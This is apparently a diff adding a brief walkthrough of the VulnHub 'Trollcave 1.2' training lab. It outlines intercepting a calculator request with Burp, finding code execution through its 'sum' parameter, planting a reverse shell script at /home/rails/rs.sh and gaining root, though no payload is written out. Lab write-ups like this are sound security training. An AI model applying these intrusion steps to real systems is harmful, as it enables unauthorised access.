+When we go to calculate looks like it doesn't work. We intercept the request using Burp.
+
+http://localhost:8888/calc?sum=1%2B1
+
+
+From function we can tell the value is converted to a string. When we execute this and get 
+
+[object Object]
+
+returned means execution is possible. 
+
+
+
+Hence, create a file with a reverse shell and put it in /home/rails/rs.sh
+Start a listener and run it.    
+
+
+
+
+
+
+Then we in as root.
+
+[1]: https://www.vulnhub.com/entry/trollcave-12,230/
+[2]: https://twitter.com/@davidyat_es
+[3]: https://www.vulnhub.com/
+[4]: https://github.com/21y4d/nmapAutomator
